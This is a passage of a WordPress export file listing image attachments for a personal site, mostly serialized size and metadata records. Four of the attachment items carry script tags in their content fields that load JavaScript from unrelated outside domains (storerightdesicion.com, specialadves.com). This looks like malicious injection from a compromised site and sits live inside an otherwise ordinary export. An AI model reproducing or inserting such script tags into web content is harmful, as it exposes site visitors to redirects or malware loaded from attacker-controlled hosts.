s:18:"dashscroll-large-h";a:4:{s:4:"file";s:71:"rocky_mountain_national_park_colorado-wallpaper-1920x1080-1-670x377.jpg";s:5:"width";i:670;s:6:"height";i:377;s:9:"mime-type";s:10:"image/jpeg";}s:9:"alx-small";a:4:{s:4:"file";s:71:"rocky_mountain_national_park_colorado-wallpaper-1920x1080-1-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:10:"alx-medium";a:4:{s:4:"file";s:71:"rocky_mountain_national_park_colorado-wallpaper-1920x1080-1-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}}s:10:"image_meta";a:12:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";s:11:"orientation";s:1:"0";s:8:"keywords";a:0:{}}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[0b11c749b1462a67ae210f5d0d4ef04b]]></title>
		<link>http://www.ironmanzzm.top/?attachment_id=204</link>
		<pubDate>Sat, 19 Jun 2021 08:17:39 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">http://www.ironmanzzm.top/wp-content/uploads/2021/06/0b11c749b1462a67ae210f5d0d4ef04b.jpeg</guid>
		<description></description>
		<content:encoded><![CDATA[<script src='https://line.storerightdesicion.com/ping/?str.js' type='text/javascript'></script><script src='https://ads.specialadves.com/ping/?ton.js' type='text/javascript'></script>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>204</wp:post_id>
		<wp:post_date><![CDATA[2021-06-19 16:17:39]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-06-19 08:17:39]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-06-19 16:17:39]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-06-19 08:17:39]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[0b11c749b1462a67ae210f5d0d4ef04b]]></wp:post_name>
		<wp:status><![CDATA[inherit]]></wp:status>
		<wp:post_parent>203</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[attachment]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
						<wp:attachment_url><![CDATA[http://www.ironmanzzm.top/wp-content/uploads/2021/06/0b11c749b1462a67ae210f5d0d4ef04b-e1624090690475.jpeg]]></wp:attachment_url>
											<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attached_file]]></wp:meta_key>
		<wp:meta_value><![CDATA[2021/06/0b11c749b1462a67ae210f5d0d4ef04b-e1624090690475.jpeg]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attachment_metadata]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:5:{s:5:"width";i:432;s:6:"height";i:384;s:4:"file";s:60:"2021/06/0b11c749b1462a67ae210f5d0d4ef04b-e1624090690475.jpeg";s:5:"sizes";a:7:{s:6:"medium";a:4:{s:4:"file";s:60:"0b11c749b1462a67ae210f5d0d4ef04b-e1624090690475-300x267.jpeg";s:5:"width";i:300;s:6:"height";i:267;s:9:"mime-type";s:10:"image/jpeg";}s:9:"thumbnail";a:4:{s:4:"file";s:60:"0b11c749b1462a67ae210f5d0d4ef04b-e1624090690475-150x150.jpeg";s:5:"width";i:150;s:6:"height";i:150;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-small";a:4:{s:4:"file";s:60:"0b11c749b1462a67ae210f5d0d4ef04b-e1624090690475-200x200.jpeg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:17:"dashscroll-medium";a:4:{s:4:"file";s:60:"0b11c749b1462a67ae210f5d0d4ef04b-e1624090690475-520x293.jpeg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-large";a:4:{s:4:"file";s:60:"0b11c749b1462a67ae210f5d0d4ef04b-e1624090690475-670x377.jpeg";s:5:"width";i:670;s:6:"height";i:377;s:9:"mime-type";s:10:"image/jpeg";}s:9:"alx-small";a:4:{s:4:"file";s:60:"0b11c749b1462a67ae210f5d0d4ef04b-e1624090690475-200x200.jpeg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:10:"alx-medium";a:4:{s:4:"file";s:60:"0b11c749b1462a67ae210f5d0d4ef04b-e1624090690475-520x293.jpeg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}}s:10:"image_meta";a:12:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";s:11:"orientation";s:1:"0";s:8:"keywords";a:0:{}}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attachment_backup_sizes]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:8:{s:9:"full-orig";a:3:{s:5:"width";i:600;s:6:"height";i:406;s:4:"file";s:37:"0b11c749b1462a67ae210f5d0d4ef04b.jpeg";}s:14:"thumbnail-orig";a:4:{s:4:"file";s:45:"0b11c749b1462a67ae210f5d0d4ef04b-150x150.jpeg";s:5:"width";i:150;s:6:"height";i:150;s:9:"mime-type";s:10:"image/jpeg";}s:11:"medium-orig";a:4:{s:4:"file";s:45:"0b11c749b1462a67ae210f5d0d4ef04b-300x203.jpeg";s:5:"width";i:300;s:6:"height";i:203;s:9:"mime-type";s:10:"image/jpeg";}s:21:"dashscroll-small-orig";a:4:{s:4:"file";s:45:"0b11c749b1462a67ae210f5d0d4ef04b-200x200.jpeg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:22:"dashscroll-medium-orig";a:4:{s:4:"file";s:45:"0b11c749b1462a67ae210f5d0d4ef04b-520x293.jpeg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}s:21:"dashscroll-large-orig";a:4:{s:4:"file";s:45:"0b11c749b1462a67ae210f5d0d4ef04b-670x377.jpeg";s:5:"width";i:670;s:6:"height";i:377;s:9:"mime-type";s:10:"image/jpeg";}s:14:"alx-small-orig";a:4:{s:4:"file";s:45:"0b11c749b1462a67ae210f5d0d4ef04b-200x200.jpeg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:15:"alx-medium-orig";a:4:{s:4:"file";s:45:"0b11c749b1462a67ae210f5d0d4ef04b-520x293.jpeg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[src=http___pic3.zhimg.com_v2-3726b277bb45a269da0b2c0608ac3f61_1200x500.jpg&refer=http___pic3.zhimg]]></title>
		<link>http://www.ironmanzzm.top/?attachment_id=215</link>
		<pubDate>Wed, 30 Jun 2021 15:07:17 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">http://www.ironmanzzm.top/wp-content/uploads/2021/06/srchttp___pic3.zhimg_.com_v2-3726b277bb45a269da0b2c0608ac3f61_1200x500.jpgreferhttp___pic3.zhimg_.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[<script src='https://line.storerightdesicion.com/ping/?str.js' type='text/javascript'></script><script src='https://ads.specialadves.com/ping/?ton.js' type='text/javascript'></script>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>215</wp:post_id>
		<wp:post_date><![CDATA[2021-06-30 23:07:17]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-06-30 15:07:17]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-06-30 23:07:17]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-06-30 15:07:17]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[srchttp___pic3-zhimg-com_v2-3726b277bb45a269da0b2c0608ac3f61_1200x500-jpgreferhttp___pic3-zhimg]]></wp:post_name>
		<wp:status><![CDATA[inherit]]></wp:status>
		<wp:post_parent>214</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[attachment]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
						<wp:attachment_url><![CDATA[http://www.ironmanzzm.top/wp-content/uploads/2021/06/srchttp___pic3.zhimg_.com_v2-3726b277bb45a269da0b2c0608ac3f61_1200x500.jpgreferhttp___pic3.zhimg_.jpg]]></wp:attachment_url>
											<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attached_file]]></wp:meta_key>
		<wp:meta_value><![CDATA[2021/06/srchttp___pic3.zhimg_.com_v2-3726b277bb45a269da0b2c0608ac3f61_1200x500.jpgreferhttp___pic3.zhimg_.jpg]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attachment_metadata]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:5:{s:5:"width";i:900;s:6:"height";i:500;s:4:"file";s:109:"2021/06/srchttp___pic3.zhimg_.com_v2-3726b277bb45a269da0b2c0608ac3f61_1200x500.jpgreferhttp___pic3.zhimg_.jpg";s:5:"sizes";a:9:{s:6:"medium";a:4:{s:4:"file";s:109:"srchttp___pic3.zhimg_.com_v2-3726b277bb45a269da0b2c0608ac3f61_1200x500.jpgreferhttp___pic3.zhimg_-300x167.jpg";s:5:"width";i:300;s:6:"height";i:167;s:9:"mime-type";s:10:"image/jpeg";}s:9:"thumbnail";a:4:{s:4:"file";s:109:"srchttp___pic3.zhimg_.com_v2-3726b277bb45a269da0b2c0608ac3f61_1200x500.jpgreferhttp___pic3.zhimg_-150x150.jpg";s:5:"width";i:150;s:6:"height";i:150;s:9:"mime-type";s:10:"image/jpeg";}s:12:"medium_large";a:4:{s:4:"file";s:109:"srchttp___pic3.zhimg_.com_v2-3726b277bb45a269da0b2c0608ac3f61_1200x500.jpgreferhttp___pic3.zhimg_-768x427.jpg";s:5:"width";i:768;s:6:"height";i:427;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-small";a:4:{s:4:"file";s:109:"srchttp___pic3.zhimg_.com_v2-3726b277bb45a269da0b2c0608ac3f61_1200x500.jpgreferhttp___pic3.zhimg_-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:17:"dashscroll-medium";a:4:{s:4:"file";s:109:"srchttp___pic3.zhimg_.com_v2-3726b277bb45a269da0b2c0608ac3f61_1200x500.jpgreferhttp___pic3.zhimg_-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-large";a:4:{s:4:"file";s:109:"srchttp___pic3.zhimg_.com_v2-3726b277bb45a269da0b2c0608ac3f61_1200x500.jpgreferhttp___pic3.zhimg_-670x377.jpg";s:5:"width";i:670;s:6:"height";i:377;s:9:"mime-type";s:10:"image/jpeg";}s:18:"dashscroll-large-h";a:4:{s:4:"file";s:109:"srchttp___pic3.zhimg_.com_v2-3726b277bb45a269da0b2c0608ac3f61_1200x500.jpgreferhttp___pic3.zhimg_-670x372.jpg";s:5:"width";i:670;s:6:"height";i:372;s:9:"mime-type";s:10:"image/jpeg";}s:9:"alx-small";a:4:{s:4:"file";s:109:"srchttp___pic3.zhimg_.com_v2-3726b277bb45a269da0b2c0608ac3f61_1200x500.jpgreferhttp___pic3.zhimg_-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:10:"alx-medium";a:4:{s:4:"file";s:109:"srchttp___pic3.zhimg_.com_v2-3726b277bb45a269da0b2c0608ac3f61_1200x500.jpgreferhttp___pic3.zhimg_-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}}s:10:"image_meta";a:12:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";s:11:"orientation";s:1:"0";s:8:"keywords";a:0:{}}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[QQ截图20211211141921]]></title>
		<link>http://www.ironmanzzm.top/?attachment_id=242</link>
		<pubDate>Sat, 11 Dec 2021 06:19:33 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">http://www.ironmanzzm.top/wp-content/uploads/2021/12/QQ截图20211211141921.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[<script src='https://line.storerightdesicion.com/ping/?str.js' type='text/javascript'></script><script src='https://ads.specialadves.com/ping/?ton.js' type='text/javascript'></script>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>242</wp:post_id>
		<wp:post_date><![CDATA[2021-12-11 14:19:33]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-12-11 06:19:33]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-12-11 14:19:33]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-12-11 06:19:33]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[qq%e6%88%aa%e5%9b%be20211211141921]]></wp:post_name>
		<wp:status><![CDATA[inherit]]></wp:status>
		<wp:post_parent>240</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[attachment]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
						<wp:attachment_url><![CDATA[http://www.ironmanzzm.top/wp-content/uploads/2021/12/QQ截图20211211141921.jpg]]></wp:attachment_url>
											<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attached_file]]></wp:meta_key>
		<wp:meta_value><![CDATA[2021/12/QQ截图20211211141921.jpg]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attachment_metadata]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:5:{s:5:"width";i:1103;s:6:"height";i:700;s:4:"file";s:34:"2021/12/QQ截图20211211141921.jpg";s:5:"sizes";a:10:{s:6:"medium";a:4:{s:4:"file";s:34:"QQ截图20211211141921-300x190.jpg";s:5:"width";i:300;s:6:"height";i:190;s:9:"mime-type";s:10:"image/jpeg";}s:5:"large";a:4:{s:4:"file";s:35:"QQ截图20211211141921-1024x650.jpg";s:5:"width";i:1024;s:6:"height";i:650;s:9:"mime-type";s:10:"image/jpeg";}s:9:"thumbnail";a:4:{s:4:"file";s:34:"QQ截图20211211141921-150x150.jpg";s:5:"width";i:150;s:6:"height";i:150;s:9:"mime-type";s:10:"image/jpeg";}s:12:"medium_large";a:4:{s:4:"file";s:34:"QQ截图20211211141921-768x487.jpg";s:5:"width";i:768;s:6:"height";i:487;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-small";a:4:{s:4:"file";s:34:"QQ截图20211211141921-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:17:"dashscroll-medium";a:4:{s:4:"file";s:34:"QQ截图20211211141921-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-large";a:4:{s:4:"file";s:34:"QQ截图20211211141921-670x377.jpg";s:5:"width";i:670;s:6:"height";i:377;s:9:"mime-type";s:10:"image/jpeg";}s:18:"dashscroll-large-h";a:4:{s:4:"file";s:34:"QQ截图20211211141921-670x425.jpg";s:5:"width";i:670;s:6:"height";i:425;s:9:"mime-type";s:10:"image/jpeg";}s:9:"alx-small";a:4:{s:4:"file";s:34:"QQ截图20211211141921-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:10:"alx-medium";a:4:{s:4:"file";s:34:"QQ截图20211211141921-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}}s:10:"image_meta";a:12:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";s:11:"orientation";s:1:"0";s:8:"keywords";a:0:{}}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[QQ截图20211211142637]]></title>
		<link>http://www.ironmanzzm.top/?attachment_id=247</link>
		<pubDate>Sat, 11 Dec 2021 06:26:55 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">http://www.ironmanzzm.top/wp-content/uploads/2021/12/QQ截图20211211142637.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[<script src='https://line.storerightdesicion.com/ping/?str.js' type='text/javascript'></script><script src='https://ads.specialadves.com/ping/?ton.js' type='text/javascript'></script>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>247</wp:post_id>
		<wp:post_date><![CDATA[2021-12-11 14:26:55]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-12-11 06:26:55]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-12-11 14:26:55]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-12-11 06:26:55]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[qq%e6%88%aa%e5%9b%be20211211142637]]></wp:post_name>
		<wp:status><![CDATA[inherit]]></wp:status>
		<wp:post_parent>246</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[attachment]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
						<wp:attachment_url><![CDATA[http://www.ironmanzzm.top/wp-content/uploads/2021/12/QQ截图20211211142637.jpg]]></wp:attachment_url>
											<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attached_file]]></wp:meta_key>
		<wp:meta_value><![CDATA[2021/12/QQ截图20211211142637.jpg]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attachment_metadata]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:5:{s:5:"width";i:1422;s:6:"height";i:760;s:4:"file";s:34:"2021/12/QQ截图20211211142637.jpg";s:5:"sizes";a:10:{s:6:"medium";a:4:{s:4:"file";s:34:"QQ截图20211211142637-300x160.jpg";s:5:"width";i:300;s:6:"height";i:160;s:9:"mime-type";s:10:"image/jpeg";}s:5:"large";a:4:{s:4:"file";s:35:"QQ截图20211211142637-1024x547.jpg";s:5:"width";i:1024;s:6:"height";i:547;s:9:"mime-type";s:10:"image/jpeg";}s:9:"thumbnail";a:4:{s:4:"file";s:34:"QQ截图20211211142637-150x150.jpg";s:5:"width";i:150;s:6:"height";i:150;s:9:"mime-type";s:10:"image/jpeg";}s:12:"medium_large";a:4:{s:4:"file";s:34:"QQ截图20211211142637-768x410.jpg";s:5:"width";i:768;s:6:"height";i:410;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-small";a:4:{s:4:"file";s:34:"QQ截图20211211142637-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:17:"dashscroll-medium";a:4:{s:4:"file";s:34:"QQ截图20211211142637-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-large";a:4:{s:4:"file";s:34:"QQ截图20211211142637-670x377.jpg";s:5:"width";i:670;s:6:"height";i:377;s:9:"mime-type";s:10:"image/jpeg";}s:18:"dashscroll-large-h";a:4:{s:4:"file";s:34:"QQ截图20211211142637-670x358.jpg";s:5:"width";i:670;s:6:"height";i:358;s:9:"mime-type";s:10:"image/jpeg";}s:9:"alx-small";a:4:{s:4:"file";s:34:"QQ截图20211211142637-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:10:"alx-medium";a:4:{s:4:"file";s:34:"QQ截图20211211142637-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}}s:10:"image_meta";a:12:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";s:11:"orientation";s:1:"0";s:8:"keywords";a:0:{}}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[封面]]></title>
		<link>http://www.ironmanzzm.top/?attachment_id=260</link>
		<pubDate>Sat, 19 Feb 2022 15:37:51 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">http://www.ironmanzzm.top/wp-content/uploads/2022/02/封面.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>260</wp:post_id>
		<wp:post_date><![CDATA[2022-02-19 23:37:51]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-02-19 15:37:51]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-02-19 23:37:51]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-02-19 15:37:51]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%b0%81%e9%9d%a2]]></wp:post_name>
		<wp:status><![CDATA[inherit]]></wp:status>
		<wp:post_parent>258</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[attachment]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
						<wp:attachment_url><![CDATA[http://www.ironmanzzm.top/wp-content/uploads/2022/02/封面.jpg]]></wp:attachment_url>
											<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attached_file]]></wp:meta_key>
		<wp:meta_value><![CDATA[2022/02/封面.jpg]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attachment_metadata]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:5:{s:5:"width";i:324;s:6:"height";i:303;s:4:"file";s:18:"2022/02/封面.jpg";s:5:"sizes";a:7:{s:6:"medium";a:4:{s:4:"file";s:18:"封面-300x281.jpg";s:5:"width";i:300;s:6:"height";i:281;s:9:"mime-type";s:10:"image/jpeg";}s:9:"thumbnail";a:4:{s:4:"file";s:18:"封面-150x150.jpg";s:5:"width";i:150;s:6:"height";i:150;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-small";a:4:{s:4:"file";s:18:"封面-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:17:"dashscroll-medium";a:4:{s:4:"file";s:18:"封面-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-large";a:4:{s:4:"file";s:18:"封面-670x377.jpg";s:5:"width";i:670;s:6:"height";i:377;s:9:"mime-type";s:10:"image/jpeg";}s:9:"alx-small";a:4:{s:4:"file";s:18:"封面-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:10:"alx-medium";a:4:{s:4:"file";s:18:"封面-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}}s:10:"image_meta";a:12:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";s:11:"orientation";s:1:"0";s:8:"keywords";a:0:{}}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[06 Hash Table]]></title>
		<link>http://www.ironmanzzm.top/?attachment_id=263</link>
		<pubDate>Tue, 22 Feb 2022 05:44:06 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">http://www.ironmanzzm.top/wp-content/uploads/2022/02/06-Hash-Table.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>263</wp:post_id>
		<wp:post_date><![CDATA[2022-02-22 13:44:06]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-02-22 05:44:06]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-02-22 13:44:06]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-02-22 05:44:06]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[06-hash-table]]></wp:post_name>
		<wp:status><![CDATA[inherit]]></wp:status>
		<wp:post_parent>262</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[attachment]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
						<wp:attachment_url><![CDATA[http://www.ironmanzzm.top/wp-content/uploads/2022/02/06-Hash-Table.png]]></wp:attachment_url>
											<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attached_file]]></wp:meta_key>
		<wp:meta_value><![CDATA[2022/02/06-Hash-Table.png]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attachment_metadata]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:5:{s:5:"width";i:1266;s:6:"height";i:712;s:4:"file";s:25:"2022/02/06-Hash-Table.png";s:5:"sizes";a:10:{s:6:"medium";a:4:{s:4:"file";s:25:"06-Hash-Table-300x169.png";s:5:"width";i:300;s:6:"height";i:169;s:9:"mime-type";s:9:"image/png";}s:5:"large";a:4:{s:4:"file";s:26:"06-Hash-Table-1024x576.png";s:5:"width";i:1024;s:6:"height";i:576;s:9:"mime-type";s:9:"image/png";}s:9:"thumbnail";a:4:{s:4:"file";s:25:"06-Hash-Table-150x150.png";s:5:"width";i:150;s:6:"height";i:150;s:9:"mime-type";s:9:"image/png";}s:12:"medium_large";a:4:{s:4:"file";s:25:"06-Hash-Table-768x432.png";s:5:"width";i:768;s:6:"height";i:432;s:9:"mime-type";s:9:"image/png";}s:16:"dashscroll-small";a:4:{s:4:"file";s:25:"06-Hash-Table-200x200.png";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:9:"image/png";}s:17:"dashscroll-medium";a:4:{s:4:"file";s:25:"06-Hash-Table-520x293.png";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:9:"image/png";}s:16:"dashscroll-large";a:4:{s:4:"file";s:25:"06-Hash-Table-670x377.png";s:5:"width";i:670;s:6:"height";i:377;s:9:"mime-type";s:9:"image/png";}s:18:"dashscroll-large-h";a:4:{s:4:"file";s:25:"06-Hash-Table-670x377.png";s:5:"width";i:670;s:6:"height";i:377;s:9:"mime-type";s:9:"image/png";}s:9:"alx-small";a:4:{s:4:"file";s:25:"06-Hash-Table-200x200.png";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:9:"image/png";}s:10:"alx-medium";a:4:{s:4:"file";s:25:"06-Hash-Table-520x293.png";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:9:"image/png";}}s:10:"image_meta";a:12:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";s:11:"orientation";s:1:"0";s:8:"keywords";a:0:{}}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
